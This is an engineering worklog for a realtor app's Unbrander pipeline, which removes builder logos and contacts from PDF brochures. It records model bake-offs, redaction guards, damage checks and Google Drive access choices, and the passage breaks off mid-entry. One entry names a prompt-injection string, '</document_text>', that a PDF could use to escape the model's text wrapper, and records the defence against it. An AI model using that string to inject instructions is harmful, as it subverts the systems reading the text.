# Worklog

Why things are the way they are. Newest first.

The code says *what*. Git says *when*. This says **why** — the option that was
rejected, the constraint that forced a shape, the bug that a comment now guards
against. If you are about to undo something here, the entry should tell you what
it will cost.

**One entry per substantive change.** Keep it short: a decision, its reason, and
anything a future reader would otherwise have to rediscover. Skip typo fixes and
formatting.

---

## 2026-10-08 — Unbrander review fixes before the first commit of the new pipeline

A review of the sort, pick, judge and repair pipeline found these, all fixed with tests:

- **verify() did not know the sort's terms.** It had only the operator's hit list, so the
  removal of a name the sort found (a sales rep, "PRESENTATION CENTRE") was flagged as
  damage, and a sales office address would have blocked the document: its street number
  is a lost word with a digit. The sort's terms now excuse those words in the damage
  check only. Adding them to the hit list was tried first and failed the brochure on the
  rerun: the OCR sweep tolerates one edit from six letters, and "ARISTA" matched noise
  ("earlrta") on two clean pages. Every text-layer match is removed by redact_terms, so
  sweeping for them added nothing.
- **A big coloured element could take a plan's lines with it.** An area removal takes
  every shape wholly inside it, and coloured elements may be up to half the page. Over an
  unlabelled part of a floor plan, nothing saw it: the text guard found no text and the
  damage check looks only outside removal areas. `remove_element` and `redact_rect` now
  refuse an area that holds a drawing from the page's own drawing (a black or gray group
  too big to offer). On the four samples it refuses nothing the models picked.
- **An image logo beside a transparent image stayed and was reported removed.** pymupdf
  takes one image mode per redaction; NONE, needed for the transparent image, also kept
  the logo. That case is now refused before anything changes.
- **Contacts on a page the guards kept were missed.** Phones and emails were taken from
  the pages the sort marked keep, not the pages that stayed after a refused drop.
- **The judge merged two elements with the same description**, so one waited a round.
- **Every kept page was re-judged each round.** A replay changes only the pages a repair
  acted on, so later rounds judge only those and reuse the rest.

## 2026-10-08 — Unbrander stops repairing a page once every repair on it is refused

On the Bright Side site plan both repair rounds proposed boxes through the gradient
horseshoe (known issue 17), the cut-through guard refused them both times, and the
second round cost about a minute of apply, OCR and judging for nothing. A page whose
repair actions were all refused now drops out of later repair rounds, and so does a
page whose repair proposed nothing: on the floor-plan rerun pages 7 and 9 answered
nothing in round 1 and the same refused removals in round 2. When no other page needs
work the rounds end. Its problems still reach the approver. The rule only
looks at repair actions, not the first pick: a refused pick says nothing about what a
repair given the refusal reason might try.

## 2026-10-08 — Unbrander on the Bright Side samples: four fixes, one known issue

The first non-Arista samples (Remington's Bright Side: a 20-page floor-plan set, a site plan,
a price list) sorted correctly and lost their logos, and showed four problems.

**The damage check counted shapes, and redaction rewrites them.** A floor plan went from
2,137 paths to 620 after one logo was removed and looked the same; every page was flagged.
The check now compares a 36 DPI gray render of each kept page before and after, ignoring the
removal areas and the strip where the mark goes, and flags a page when over 0.2% of it
changed. Word loss is still checked word by word.

**The price list kept its sales contact block.** The term matcher allowed only spaces,
hyphens, dots and underscores between letters, so "sales@remingtonbrightside.ca" never
matched, and with every term absent the whole `redact_terms` was refused. Any one
non-alphanumeric character now separates. And code now adds every phone number and email on a
kept page to the terms, as the skill's own hit list did: the sort had listed neither. The
sales rep's name is still the sort's job.

**Big decorative marks were never offered.** The faint flower watermark across the bottom of
each floor plan is over 5% of the page, so it had no number, and a freehand box cut half of
it away on one page. Shape groups up to half the page are now offered; the text guard keeps a
floor plan of the same size, since it holds room labels. Drawings over half the page are left
out of the grouping, so a page background no longer joins every shape into one group.

**Then three more** (same day, after a rerun). Shapes are grouped by colour as well as
distance: black and gray apart from coloured, so a pale watermark a few points from a black
plan is its own element. Black and gray groups stay capped at 5% of the page, because a plan
whose labels sit outside its lines has no text for the guard to see; coloured groups may be
half the page. A `redact_rect` that cuts through a drawn shape is refused, since only shapes
wholly inside go and a half-removed flower is worse than a whole one. And the words above a
removed name that vanish with it are a MuPDF glyph-box limit, not fixable by a smaller
rectangle (known issue 18); a watermark under plan labels cannot be taken alone (19).

**Rejected after testing: clearing a transparent image under a logo.** The leftover
Remington horseshoes on the site plan looked like part of the map image. Zeroing the image's
soft mask under the logo cut a white hole in the park and left the horseshoe: it is a
gradient fill clipped to the logo, which `apply_redactions` cannot remove (known issue 17).
Rewriting the image's pixels with `replace_image` was worse: it lost the transparency and
painted solid blocks.

---

## 2026-10-08 — Unbrander: sort pages, pick elements by number, check for damage

Run 6 passed `verify()` and was still unusable: whole brand panels gone, black boxes on page
3, the small "A" mark missed, repairs landing in the wrong place twice, and the "20'" badge
text taken off ten floor plans. One cause under most of it: **models were asked to draw
boxes.** Gemini Flash answers `[ymin, xmin, ymax, xmax]` whatever order is asked (and asking
for x first makes its boxes worse); Pro's boxes drifted 40% when it saw 24 pages in one call;
even at best Gemini scores about YOLOv3 level on COCO, and Claude's docs call its coordinates
approximate. Loose boxes then needed `REMOVE_IF_TOUCHED`, which took every panel a box
touched.

**Code finds the elements, the model picks numbers.** Each page's image placements and
groups of vector shapes (pymupdf's `cluster_drawings`, merged within 6 points because it
split the ARISTA logo in two) are numbered on the render; a model answers with numbers and
`remove_element` removes the element by its own outline, with `REMOVE_IF_COVERED`. This is
set-of-mark prompting (Microsoft, 2023) and what Anthropic's tool guidance says: give the
model ids, not raw values. On the brochure the SC monogram and the ARISTA logo are one
element each, and the tiny "A" every model missed is on the list. A box stays as the last
resort, asked for in Gemini's own axis order and turned around in the adapter.

**Sort the pages first.** The skill's own output of the same brochure (made with the skill in
Claude) kept 13 of 24 pages, the elevations and floor plans, removed two elements
per page and lost no word. Our prompt dropped only pages that were "marketing and nothing
else", so run 6 fought the cover, the award page and the portfolio. Now one call sorts every
page by kind and keeps plans, elevations, site plans, price lists, feature sheets and terms
(Sarath, 2026-10-08). Code ignores a drop of those kinds, and `drop_page` refuses a page with
a room dimension or a price. The mark position follows from the kinds, not the model.

**A damage check.** `verify()` compared names and numbers but not what was lost. Now every
source word on a kept page must survive unless it is a builder name or `redact_terms` took
it; a lost word with a digit blocks. Shapes and images gone outside every removal flag. On
run 6's output it blocks ten floor plans and shows the "also removed" lists were wrong: the
labels they named were still there.

**The black boxes.** pymupdf's `delete_image` leaves a transparent stand-in, and blanking
part of it by pixels painted it black. `delete_image` is gone (it also emptied the image on
every page that drew it); an area removal deletes images wholly inside it and leaves a
transparent image it only overlaps.

**After run 7** (all Flash: the 13 expected pages, no logo left, $0.044, 157 s), two holes
closed. A repair added `redact_terms` for "The Carson", a model name, and the damage check let
it through because it trusted whatever `redact_terms` took. Now only the sort names text to
remove, and the damage check expects only the builder's names and contact details to go.
Also, the "also removed" lists were still false: rewriting a page moves unchanged words by
about 1e-4 points, so lost words are now found by text, not by box.

**The model bake-off** (model-check.md): nine runs, under $0.60 in all. Every model found
every logo once elements were numbered; they differed only in what else they removed. Gemini
2.5 Flash took the teal band and the "20' TOWNS" badge; Haiku 5.5 picked perfectly but used
boxes on captions it misread; weak judges called model names branding and the repair boxed
them out. Gemini 3.8 Flash with low thinking for pick, judge and repair, 2.5 Flash to sort,
passed clean at $0.069 and 115 s, and those are now the defaults, with a per-role thinking
setting. Thinking is chosen per role because it hurt Gemini 2.5 Flash's boxes and helped 3.8
Flash's picks.

**A text guard on area removals.** Every wrong removal in the bake-off was a box or an
element over text that is content: a model name, a photo caption, the "20' TOWNS" badge. On
the brochure none of the 16 builder elements holds any text, and almost every element that
must stay does. Names in the text are removed by `redact_terms` before any area action, so
`remove_element` and `redact_rect` now refuse an area that still holds any word that is not
the builder's, before anything changes. A text-free element that should stay (the teal band
on two elevation pages) is still the model's call.

**Kept, considered and rejected.** Repair stays a separate role from the judge (Sarath).
Rejected: snapping boxes to edges, OpenCV or a logo detector (the PDF already says where
everything is), and editing content streams per path (pymupdf has no per-path delete). One
plan call for the whole document is gone: slowest, dearest, least accurate. Models are
settings per role, all Flash for now; a bake-off chooses (PHASES.md).

---

## 2026-10-07 — Unbrander: the three failures of live run 5

The call log made each cause visible.

**One wrong term cancelled all text removal.** The planner sent seven terms in one
redact_terms, including `ARISTA’s`, which the text layer does not have. The guard refused the
whole call, so "Arista Homes" and "SouthCal" stayed on every page: 51 verify findings and a
repair on most pages. redact_terms now removes the terms it finds and reports the rest; it
still refuses when none is found. The prompt also says matching already ignores case and
tolerates separators, so variants are not needed. Considered and rejected: code removing the
hit list itself (a project name can be a street name that must stay), and having the model
call a "remove known names" action with exceptions (more tools for a problem the smaller fix
solves).

**The judge looped.** Flash at temperature 0 wrote one leak thousands of times until its 65k
output limit: 269 s, $0.17, unparseable. Output is now capped per role, so a loop fails in
seconds and the existing retry asks again; leaks are deduplicated; the prompt asks for each
element once per page. Temperature stays 0.

**A network blip ended the run.** `ssl.SSLError: BAD_RECORD_MAC` on a call that lasted 0.05 s,
likely a stale pooled connection. The OpenRouter SDK retries `httpx.NetworkError` and
timeouts only, and httpcore had not wrapped this one. The adapter now retries broken
connections itself, 3 tries; any other error still raises.

---

## 2026-10-07 — Unbrander model calls survive bad answers; plain names in code

**Strict JSON schema over function calling.** The fourth live run died after 15 minutes
because Gemini Flash, as judge, answered in prose instead of filling the form; an earlier
run got a box written as a string. Function calling only asks the model to call a
form-shaped tool. `method="json_schema", strict=True` makes the provider constrain
generation to the schema, and OpenRouter lists it for both Gemini models. The schemas became
strict-compatible (every field required, nullable where optional, no extra fields). The
item-by-item validation stays, for answers with the right shape and a wrong meaning.

**Retry once, then degrade by role.** A plan with no answer fails the job: there is nothing
to apply. A repair with no answer adds nothing and its problems stay in the report. A judge
with no answer becomes one `block` finding, because the output exists and verify() has run;
a person looks at the pages instead of the run being thrown away.

**A local call log, not LangSmith.** LangSmith is a hosted service: builder pages and text
would go to a third party, retention is short on the base plan, and it is a new service to
agree. Langfuse or Phoenix would be a new service to run. A LangChain callback (`CallLog`)
that appends one JSON line per call to `.local/` is enough to debug model-check runs. It
writes as each call ends, and the script saves each round as it ends, so a late failure
keeps the evidence. Revisit a tracer when the golden set needs a UI.

**Plain names in code.** Plan shorthand had leaked into code: a module called `m2.py`,
docstrings citing "U3" and "D16", locals like `tb`, `a`, `cfg`. Nobody reading the code
without the plan open can decode those. `m2.py` is now `unbrand.py`, every single-letter and
abbreviated name in Unbrander became the noun it holds, and the rule is in working-rules.md
and enforced by `tests/test_naming.py`. The single-letter check covers Unbrander only for
now; the rest of the app is known issue 16.

---

## 2026-10-07 — Unbrander M2 as plan, execute, judge, repair, on LangChain (U2 step 3)

**Shape.** A strong model sees every page (text and render) once and returns the whole plan
as tool calls with their inputs and a reason. Code applies them through the tool guards.
verify() and a model judge look at the output, and a cheaper model repairs only the pages
still wrong, at most twice. This is orchestrator–workers plus evaluator–optimizer. It
replaced the first design, one agent loop calling a tool per turn: that needs about ten
turns that each resend every page, and the skill's own budget (about 15 calls) cannot even
cover rendering a 24-page brochure once. A cheap per-page executor model was also dropped:
it would only re-apply the planner's decisions.

**Replay from the source.** Each round applies every action so far to a fresh copy of the
source. Rounds are deterministic and safe to repeat, the property the U3 worker needs, and
a repair never stacks on a half-saved file (`finish()` closes the session).

**The judge adds, never clears.** A model judgement can start a repair or reach the
approver, but `passed` stays the code checks alone. Only `retry` findings drive a repair: a
`block` (a changed number, OCR not run) is not fixed by removing more.

**LangChain now, for Unbrander only (D10 revised).** Sarath decided the agent stack moves to
LangChain; Unbrander's model calls are new code, so they start there instead of being
written twice. Only `langchain-openrouter` is added (it brings `langchain-core`): every call
is one structured-output call and the loop is our code, so `create_agent` and its middleware
are not needed yet. Chat stays on PydanticAI until U8. The `UnbrandModels` port keeps the
framework in one adapter.

**Not LangGraph for the pipeline (D18).** The flow is linear with two human gates. LangGraph's
checkpoints are hard to query, so the admin app would still need the `jobs` table, and the
worker, queue and lock are not part of open-source LangGraph. A status column and one step
function per state is smaller.

**Flat output schema, validated item by item.** The model fills one optional field per tool
argument rather than a tagged union (which becomes `oneOf`, not accepted by every provider
behind OpenRouter). Each item is converted to a domain action on its own: in the first real
run Gemini Flash wrote one box as the string `'618, 780, 628, 830], '`, which failed the
whole judge answer. Now that item is dropped and listed, and a leak with a bad box is kept
without the box.

**JPEG renders.** The first real run was refused: 24 pages at 100 DPI are 38 MB as PNG,
over OpenRouter's 30 MB image limit per request. JPEG at quality 85 is 7 MB. Exact words come
from the text layer and verify() renders for OCR itself, so the softening only touches what
the model looks at. The client timeout was raised to 10 minutes: the SDK default cut the
first plan call short.

**Also decided today, recorded for U3:** an advisory lock per job instead of `SKIP LOCKED`
(D19; a row lock holds only while a transaction is open, which would hide progress, and a
dead worker's advisory lock frees itself); volume files evicted after a configurable period,
30 days by default (D20); the operator's `instructions` on the job (D21); model API errors
as a sub-category of General errors (D22).

---

## 2026-10-07 — Unbrander M2 tools (U2 step 1)

The tools the M2 model calls: `render_page`, `get_text`, `redact_terms`, `redact_rect`,
`delete_image`, `drop_page`, `add_mark`, plus `finish()`, which is code. Each guard is inside
its tool, so a wrong decision is refused in code, not left to the prompt.

**A second port, `PdfEditor`**, next to `PdfInspector`. The guards (what may be removed, how
much, how often) are policy and are tested pure, on an in-memory session; pymupdf mechanics
stay in one adapter. Rejected: adding edit methods to `PdfInspector`, which would mix reading
facts with changing the file under one port.

**Boxes on a 0–1000 grid.** Gemini emits boxes on this grid natively, Claude handles it, and
it doesn't depend on the render DPI. Rejected: render pixels (tied to the DPI) and PDF points
(the model would convert by eye).

**Drops and the mark wait for save().** If a page were deleted at once, every later page
number would shift under the model mid-run. A mark added early could be removed by a later
redaction.

**Term matching moved to `domain/terms.py`.** The tools and `verify()` must find a term the
same way, or verify would pass what the tools never looked for.

**Text is redacted on the middle band of each word box only.** MuPDF removes every glyph
whose box touches the redaction rect, and glyph boxes span the full line height. In the spike
brochure, "BUY AN ARISTA" sits over "STAR® CERTIFIED" with overlapping line boxes, so
redacting ARISTA's full box also took the "®" and "CERTI" below. `verify()`'s provenance
check caught it as "FIED" and "PTIONAL". The fix leaves out 35% of the height at the top and
at the bottom. If a sample with tighter leading shows the same fragments, that number is the
place to look.

**From the review of the first version.** `get_text` escapes angle brackets, so a PDF that
contains `</document_text>` cannot close the wrapper. `delete_image` checks the image's size on
every page that draws it, because pymupdf empties the image everywhere. Tools refuse to run
after `finish()`, since the document is closed. `scrub()` keeps hidden text: in a scanned
brochure that is the OCR layer. The mark is placed in the page's visible orientation, so
rotated pages get it bottom-right and upright.

**`redact_terms` refuses a term that is not in the source's text layer.** It would remove
nothing, and a model reaching for one is usually looking at drawn text, which needs
`redact_rect`; the error tells it so.

---

## 2026-10-07 — Unbrander `verify()`, before any M2 tool

`verify()` is the code gate between M2 and the human, and it comes first because every route
needs it: our own tools, the Managed Agent, any model. It never reads the model's report. In
the Managed Agent spike, Haiku's report claimed removals its PDF did not contain.

**A port, `PdfInspector`, with one pymupdf adapter.** The adapter reads a PDF into plain facts
(words, paint order, OCR text, metadata, object text); `verify()` is pure logic over two sets
of facts. That keeps the checks testable without PDFs, and the M2 tools will read through the
same adapter. Rejected: pymupdf inside `verify.py`, which would mix parsing with judgement and
need real PDFs for every test.

**Beyond the four checks AUTONOMY.md first listed**, each from something that happened:

- *OCR in three modes, in v1.* White text on a teal panel shipped once; only pixels show it.
  The "light" mode isolates light ink. OCR not run is a block, and the adapter raises
  `OcrUnavailable` rather than returning empty text.
- *Raw-object sweep, including metadata streams.* Running verify on the spike outputs found
  Opus's PDF, which its grader passed, still carrying `SouthCal_DT 2001` and the designer's
  `/Volumes/.../ARISTA/` paths in the XMP of eleven images. The first version skipped all
  stream bodies and missed it.
- *Cover-up.* An opaque box drawn over text or an image hides it without removing it; Haiku
  did this twice. Only opaque fills count, so a translucent tint over a photo is not flagged.
- *Whole-word matching.* "Inc" matched "include" in a field report's sweep.

**Generic URLs and phones flag, not retry.** The brochure quotes a natural-resources.canada.ca
Energy Star link. A builder's own URL carries its name, and the hit list catches it.

**Provenance normalises with NFKC.** Sonnet's re-typeset text used ligatures (`ﬂ`) and a font
whose `ti` ligature has no text mapping, so "exceptional" extracts as "excep onal" while it
renders correctly. Those fragments stay as flags: the page looks right, but its text layer is
damaged.

**tesseract is not a Python dependency.** It is a system binary; the agent's startup and
doctor script will install and check it. The OCR adapter test skips, with its reason, when it
is absent. Dependencies added: `pymupdf`, `pillow`.

## 2026-10-06 — Chat moved into its own capability slice

Aura Agent is one realtor agent with several capabilities. The code now says so: `app/` is
the shared platform (config, container, auth, portal client, project data, limits,
diagnostics), and each capability is a slice under `app/capabilities/<name>/` with its own
`domain/`, `ports/` and `adapters/`. Chat moved first, as a pure move with no behaviour change
(same endpoints, same SSE contract, same start command; 350 tests before, 350 + 2 after), so
Unbrander is built in `app/capabilities/unbrander/` in the same shape instead of being mixed
into chat's folders.

What moved: the chat routes (`app/chat.py` is now `routes.py`), conversations, feedback,
prompts, tools, cli and bench; `Turn` and `Feedback` from the domain; the `AgentRuntime`,
`ConversationStore` and `DocumentIndex` ports; the PydanticAI and Postgres adapters with
`schema.sql`. What stayed shared: `Claims`, `Role`, `ChatMode`, `Viewer` and `Project`, because
the redacting project repo depends on the viewer's mode and any capability may read projects;
`config.py`, because the model provider is platform. The Container field names did not change.

`test_layering` now applies its three rules to every `domain/`, `ports/` and `adapters/` dir,
not only the top-level ones, and adds two: shared code imports a capability only in
`container.py` and `main.py`, and a capability never imports another one.

Rejected: a thin slice that moved only chat's top-level modules and left every port and
adapter in the shared folders. It was fewer moves, but Unbrander's ports and adapters would
have joined chat's in shared folders, and nothing would show which capability owns what.

No router or supervisor agent: users reach each capability through its own UI. One gets added
when a single entry point must reach several capabilities, and even then the chat agent would
start an Unbrander job through a tool, never run it inside the chat loop (SECURITY.md).

---

## 2026-10-06 — Docs moved under aura-chat/; two docs removed

The docs moved from `docs/` to `aura-chat/docs/`, with the chat docs under
`feature/aura-chat/` beside `feature/Unbrander/`. The move left every relative link in
`AGENTS.md`, `aura-chat/README.md` and the docs themselves pointing at the old paths; they
were rewritten in this change and a link check now finds none broken. The Unbrander design
was flattened from `feature/Unbrander/Docs/agent/` to `feature/Unbrander/`: the extra two
levels held nothing else.

Removed: `investigation-aur-3-4-5.md` (the pre-build discovery; its findings live in
`architecture.md` and the 2026-08-24 entry below, and its line links into `Core.js` had gone
stale) and `sprint-tracker.html` (the AUR-* board, which nothing read and was no longer kept
current). Both are in git history. `WHITEBOARD.md` was kept: it is the only record of the
manual process the outcome baseline is measured against. `portal.md` describes the repo-root
portal but now sits under `aura-chat/docs/`; left there for now.

Older entries below keep the paths that were true when they were written.

---

## 2026-10-06 — Unbrander: spike phase U1 folded into U2

The separate spike would have built the PDF tools as throwaway code just to test whether a
model can drive them. The tools are needed in production anyway, so they are built once and
the model is checked on the 3 real sample PDFs inside U2, before any pipeline or UI work (U3+).
The risk the spike guarded against is still caught at the same point; only the throwaway code
is gone. The golden set is labelled by Sudhanshu's team reviewing outputs once, since there
are no stored branded/unbranded pairs to build it from. Phase numbers are kept so U8 and
other references do not move.

---

## 2026-10-06 — Unbrander U0: Google access settled with the admin team

The admin team keeps no unbranded documents in Drive today, so nothing is moved: output starts
in a new Shared Drive, "Aura Agent". A Shared Drive is needed because a service account has
no storage quota and cannot own files in anyone's My Drive; the folder the admin first shared
(in a My Drive, open to anyone with the link) would fail with `storageQuotaExceeded`.

Rejected: using the `office@aurakeyrealty.ca` login (it holds all final paperwork, so a shared
password exposes every deal, breaks on 2-step verification, and makes every action look like
the office's); a new paid Workspace user (licence cost, and its refresh token dies on a
password change); the operator's 2Creative account (files would be owned outside Aura's
Workspace and leave with the operator). The Cloud project is created with the company
Workspace account so it sits under Aura's organisation. During development the operator's own
login is used, against a test folder and a copy of the sheet only.

---

## 2026-10-06 — Aura Chat becomes Aura Agent

The product is now a realtor agent with several capabilities, aimed at automating the
manual work realtors and staff do today; Chat is the first capability and Unbrander the
second. `AGENTS.md` and the roadmap are reframed, `docs/platform.md` states the purpose and
the rules every capability follows, and `architecture.md` gains §11 rather than having its
V1 sections rewritten — they are the record of what the chat was designed to be.

Order of work: finish Unbrander end to end, doing only the platform work it needs, then the
heavy changes (LangChain / LangGraph, U8; renaming `aura-chat/` and `docs/aura-chat/`). The
rename is deferred because it touches Railway config, deploy scripts and every link, which
would stall feature work for no user-visible gain. Docs that describe code
(`how-it-works.md`, `the-agent.md`, `api.md`, `schema.md`, `operations.md`) are updated as the
Unbrander code lands, not ahead of it.

---

## 2026-10-06 — Agent loop migration to LangChain / LangGraph is decided, as phase U8

Decided now, scheduled after Unbrander goes live, because the app is growing into a
multi-capability agent. It runs last on purpose: by then there is a working system, the
chat benchmark and the Unbrander golden set to prove the migration changed nothing for the
worse. Cost is bounded by the `AgentRuntime` port — the chat side is one adapter
(`agent_pydantic.py`, 340 lines) — so tools, domain and the PWA's SSE contract stay put.
Whether to use LangChain v1 or LangGraph directly is decided at the start of U8.

---

## 2026-10-06 — Unbrander: service account, with the Unbranded tree in a Shared Drive

The brokerage is on Google Workspace, so a service account works if the files sit in a
Shared Drive: a service account has no storage quota and cannot upload into anyone's My
Drive. The Unbranded tree moves into a Shared Drive with the service account as a member,
and the sheet is shared with it as Editor. Rejected: a dedicated Workspace user with an
OAuth refresh token — it costs a seat and its token breaks when the account's password or
policy changes. Moving a folder keeps its file ids, so the links already in `UNBRANDED`
cells should keep working; U0 tests that on one folder before moving the rest.

---

## 2026-10-06 — Unbrander: Aura Chat writes to Google directly

Reverses the Apps Script choice of 2026-10-05. Apps Script caps a request near 50 MB and a
run at 6 minutes; a large site plan sent as base64 could fail, and every write path would
need a clasp deploy. Writing through the Drive and Sheets APIs from Aura Chat removes both.
The cost is a Google credential with standing access — invariant 2's first exception —
contained by scoping it to the Unbranded tree and the sheet and by letting only post-approval
pipeline code use it. If the Unbranded tree is in a personal My Drive, a service account
cannot upload there (no storage quota), so a dedicated Google user account is proposed instead.

Also settled: files between steps on a Railway volume; Vite + React admin app on its own
Railway service; ports `JobStore` and `GoogleWriter`; model chosen by the golden set.

---

## 2026-10-05 — Unbrander: writes via Apps Script, existing UNBRANDED cell, separate admin app

- **Writes go through a new admin-only Apps Script action** called with the approver's
  token, not a Google service account. Apps Script already holds Drive and sheet access;
  a service account would be a second credential with standing privilege and would break
  invariant 2.
- **Publishing fills the existing `UNBRANDED` cell** (`Core.js:85`, shown as the "Drive"
  button) rather than a new column. Staff already paste the Drive link there, so realtors
  see the result with no portal change, and a filled cell is how an update is detected.
- **PyMuPDF + reportlab.** PyMuPDF is the only library with true redaction (characters and
  image pixels under a rect deleted, vector line art kept). It is AGPL-3.0; used unmodified
  in a never-distributed service, the source obligations do not trigger. Fallback if that
  changes: pypdfium2 + pikepdf and our own object-level redactor.
- **The UI is a separate admin app**, the start of an Aura Agent UI, not more screens in the
  3,300-line `Script.html`.
- **Five-port cap lifted.** It fit a read-only chat; a write-capable agent needs a job store
  and a writer seam. New ports still need a stated reason.
- **No LangGraph yet.** PydanticAI sits behind `AgentRuntime` (one 340-line adapter), and the
  Unbrander loop is a fixed pipeline with a Postgres job table, so a graph framework buys
  little now. Re-evaluate after Unbrander ships.

---

## 2026-10-05 — Unbrander design: built in Aura Chat, with named PDF tools

Unbrander (builder-document unbranding) is built inside Aura Chat, which therefore stops
being read-only; invariant 5 now says the *chat* stays read-only and pipeline writes need an
admin's approval. A second system was rejected because it would duplicate the portal's
Drive and sheet access.

The unbranding step uses **named PDF tools** (`redact_terms`, `redact_rect`, `replace_line`,
…) that our code runs with `pymupdf`, rather than letting the model write code. Two
alternatives were rejected. The Claude API code-execution sandbox has no network and no
`pymupdf`, so the existing skill's `pip install` step cannot run there. A self-built code
sandbox on Railway would work, but it lets text inside a builder PDF steer code that runs
on our server; fixed tools close that path, and they let "no new words" and "no changed
numbers" be enforced in code. Cost of reversing: the tools are the skill's logic moved into
Python; going back to code execution means building and securing a sandbox.

Job state and the queue live in the existing Postgres. Publishing writes the link to a new
sheet column. The Drive and sheet write mechanism (Apps Script action or service account) is
still open. Design: `docs/feature/Unbrander/Docs/agent/`.

---

## 2026-10-05 — docs/aura-chat tracked again; feat/pwa merged to main

`4a39f8b` ("feat: final") had gitignored and untracked all of `docs/aura-chat/`,
which left `AGENTS.md` linking to files a fresh clone does not have and took the
docs out of version control. No reason was recorded, and nothing in them is new
exposure: the sheet ids and the Railway URL they mention are already in tracked
code (`Core.js`, `aura-chat/scripts/deploy.sh`). They are tracked again, along
with `docs/feature/` (the Unbrander agent design notes).

`main` had sat at `1f208d4` since 2026-08-22 because no PR was ever opened, not
because anything was held back: `feat/pwa` was a clean 49-commit superset. It is
merged, and new work branches from `main`.

---

## 2026-08-27 — property tax rates reviewed and repaired after landing unlogged

Sudhanshu pushed the property-tax feature (Tax.js, a `taxrates` action, the
Property Tax screen and live Home Expenses rates) under commit messages that
described none of it — one said "Update print statement from 'Hello' to
'Goodbye'" and actually appended a byte-identical second copy of the entire
client script. This entry stands in for the worklog entry that change should
have carried, plus the review fixes.

**The feature's decisions, as found in the code and kept:** one rate per city —
the sheet's default-area flag collapses Hamilton's 24 areas to one; where no
2026 rate exists the 2025 one is served and labelled; the 45-municipality table
inside AKX stays as the offline fallback and the payload *corrects* it rather
than replacing it. Bootcamp was also hidden from the drawer (`off:1`) in the
same push — deliberate mothballing per the comment, kept.

**Review fixes (behavior preserved, defects removed):**
- The duplicated 3,225-line script block is deleted. Both copies executed:
  two login POSTs per Sign-In tap, double `route()` per navigation.
- `'Property Tax Rates', 'Active Rates'` removed from `ALLOW.main`. The feature
  never consulted ALLOW (Tax.js reads its tabs directly); the entries only let
  any realtor token pull the raw sheets — every rate area and editorial column —
  through the generic `tab` action, bypassing `buildTaxRates_`'s curation.
- `cachedBuild_` no longer caches an `ok:false` payload: a tab renamed for a
  minute during warm-up used to pin "tab missing" for the full 6h TTL. The
  Property Tax error screen also gained a Retry (it had no fresh-path out).
- `applyLiveRates` no longer stamps a missing upper-tier split as `0` — that
  read as a known figure and dropped the whole regional share (Whitby computed
  ~0.713% instead of ~1.413%). Null now falls through to the shared constants.
  Workbook-only cities with no combined rate stay out of the expenses picker
  for the same reason: their computed rate was `0 + 0 + education`.
- The sheet's yes/no columns are matched on leading Y (`ptYes_`) instead of
  three different exact spellings; the GTA tab compares municipality names with
  case and punctuation stripped. Both were silent row-droppers.
- The history tab is filtered to the served default-area keys before indexing —
  it is append-only and grows by hundreds of rows a year for a ~50-key join.
- `pageCount` returns the text it builds; the Property Tax count line was
  rendering the literal string "undefined".

## 2026-08-27 — four known issues fixed: dates, future dates, website_url, id case

Known-issues #1, #2, #6, #7 — the quick high-severity batch. Entries deleted
from known-issues.md per its own rule; the reasons live here.

**Dates read month-first, day-first kept as a provable fallback (#1).**
`_DATE_FORMATS` tried `%d/%m/%Y` before `%m/%d/%Y`, so every ambiguous slash
date (day 1–12) parsed day-first — 10 of the 23 dated projects were wrong, and
the misreads landed in the future, which is what stuffed "what changed this
week" with April projects. The sheet is typed month-first. Rejected the
known-issues proposal to *delete* day-first entirely: after the reorder,
`%d/%m/%Y` can only match a value month-first cannot parse (first number
13–31), which is exactly the case where day-first is provable — so keeping it
costs nothing in ambiguity and survives a stray day-first entry. `09/31/2025`
(Arbor West) still parses as nothing, correctly. The docstring's claim that the
value is "only ever shown, never used to decide" was stale — `recent()` sorts
on it — and is rewritten.

**Future dates excluded from recent(), counted for /doctor (#2).** A date after
today now cannot rank first in "what changed this week" — it is excluded at
query time (a cached future date legitimately becomes past) and counted at
index time as `future_dated`, surfaced in the `data_quality` check next to
unparsed prices, flipping it to not-ok. Counted rather than silently dropped:
dropping trades a wrong answer for a missing one. Harvest Park (`10/25/2026`)
stays wrong in the sheet — that row is Sudhanshu's.

**The model now sees website_url (#6).** `_for_model` sent `source` (empty on
all 161 rows) and none of the three filled link columns, so "which projects
have a website I can send a client?" was unanswerable. `website_url` is added —
it is deliberately in neither CLIENT_HIDDEN nor CONFIDENTIAL_FIELDS, so no
redaction change. Decided with Sarath: `drive_url` stays model-invisible. It is
internal material; the card payload already carries it for realtors, and
keeping it out of the model's context means it cannot be quoted into prose in
front of a buyer.

**Id lookup casefolds (#7).** `repo.get("ak-0002")` now finds `AK-0002`; the
fake mirrors the adapter so the contract stays one contract.

Not touched, deliberately: benchmark expectations (#8 says fix those last, after
behaviour), and `test_recent_returns_the_most_recently_updated_first`, which
hard-codes 2026 dates and will rot in 2027 — off this change's path.

---

## 2026-08-25 — how-it-works.md catches up with what was built

**What.** The end-to-end walkthrough was written at Phase 3 and still said the
chat screen, conversation storage, audit logging and rate limiting were "not
built yet". Rewritten against the running service, not from memory: the traced
timeline in Part IV, the audit line, the stored thread and the
compare-follow-up ids are all captured from live requests made while writing.

**Two new parts rather than a new document.** Persistence (Part V) and feedback
(Part VI) are flows of the one system the document promises to walk end to end;
a separate file would have split "what happens to a question" across two reads.
Old parts renumbered V→VII through X→XII, and every internal anchor
re-verified. All 20 mermaid figures parse-checked by actually rendering them.

**The style learned from the later additions.** The clarifications Sarath added
after first reading (the Deps-lifetime and Project-boundary commit) all have the
same shape: define the term inline the first time it appears, state lifetimes
explicitly, one concrete micro-example. New sections are written to that shape
up front — asyncpg gets a sentence, middleware gets a sentence, EventSource's
rejection is explained rather than asserted.

**Numbers updated where they had drifted**: 38→103 lines for main.py, 192→343
tests, four→five tools, 246→162 projects, and the every-file index regenerated
from the tree rather than patched.

---

## 2026-08-25 — Hardening, mode, and the 4b surfaces

**What.** AUR-20, 21, 38, 50, 57, 62, and the handoff docs 86/87/89/90/91/92/93.
Rate limiting and audit logging, the mode round trip, a chats panel, an admin
reports screen.

**The rate limit counts in memory, per process, and that is the whole cost.**
A second replica doubles every ceiling because neither knows about the other's
count. Redis for twenty realtors is a service to run, monitor and pay for in
order to make a number exact that only has to be roughly right. Written into
operations.md §2 rather than left as a surprise; revisit it the day a second
replica exists, not before.

**60 questions an hour, per user, chosen not derived.** The sizing input the
architecture doc wanted — the Apps Script tier — is still unconfirmed, and
waiting for it meant shipping nothing. A realtor working hard asks ten in an
hour; a client stuck in a retry loop trips this in about a minute. `/login` and
